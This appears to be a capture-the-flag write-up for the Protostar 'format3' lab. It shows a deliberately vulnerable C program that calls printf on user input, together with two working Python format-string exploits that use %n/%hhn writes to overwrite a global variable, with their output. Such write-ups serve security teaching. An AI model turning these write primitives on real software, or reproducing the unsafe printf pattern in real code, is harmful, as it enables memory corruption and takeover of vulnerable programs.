# FORMAT 3

# SOURCE CODE

```c
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

int target;

void printbuffer(char *string)
{
  printf(string);
}

void vuln()
{
  char buffer[512];

  fgets(buffer, sizeof(buffer), stdin);

  printbuffer(buffer);                         // <- Format String Vuln
  
  if(target == 0x01025544) {
      printf("you have modified the target :)\n");
  } else {
      printf("target is %08x :(\n", target);
  }
}

int main(int argc, char **argv)
{
  vuln();
}
```

## OVERVIEW & IDEA

- First thing we can see of the source code is the code has format string vulnerability. And The chall asked us to modifide the target to 0x01025544. So we'll use format string to write on content of target, change it 0x01025544.

## DETAIL

- Like format 2, I just go through a bunch of old stuff to get the address of target, index of buffer. And I found:

```
address of target: 0x80496f4
index of buffer  : 12
```

- We can directly write 0x01025544 to target, but in some chall, the value can be too large to one-shot write. It's a good practice to solve this chall by separate the number of byte to write on.

- Because the value we write on address is size of string that we'll print, and this size can only increase the size of stay the same size, so we sperate the byte to write, it can be a permutation of `{2, 1, 1}` or just `{2, 2}`, then we specify the order of byte to write from smallest to largest, the next and just use `%hhn %hn` to write.

- In this chall, I will seperate 0x01025544 to `2-1-1` `{0x0102, 0x55, 0x44}`, then write with order `0x44 -> 0x55 - 0x44 -> 0x0102 - 0x55` into `0x80496f4 -> 0x80496f5 -> 0x80496f6`. We print `0x55 - 0x44` bytes after `0x44` because the previous print we have already print `0x44` bytes, so the next print we just only print the remain to output that reach the printed string to `0x55` bytes, and so on....

## EXPLOIT

```python
# filename: exp1.py

payload = "\xf4\x96\x04\x08"
payload += "%16930112c%12$n" # 0x01025544 - 4

print(payload)

# python exp1.py | ./format3
```

```python
# filename: exp2.py
payload = "\xf4\x96\x04\x08"
payload += "\xf5\x96\x04\x08"
payload += "\xf6\x96\x04\x08"

payload += "%56c%12$hhn"  # 0x44-0x0c = 56 because we have already printed 12 bytes address.
payload += "%17c%13$hhn"  # 0x55-0x44 = 17
payload += "%173c%14$hn"  # 0x0102 - 0x55 = 173 

print(payload)

# python exp2.py | ./format3
```

## RESULT

- exp1.py

```
root@protostar:/opt/protostar/bin# python exp1.py | ./format3

.. a really really large of space ..

you have modified the target :)
```

- exp2.py

```
root@protostar:/opt/protostar/bin# python exp2.py | ./format3
�����                                                                       �
                                                                               �
you have modified the target :)
```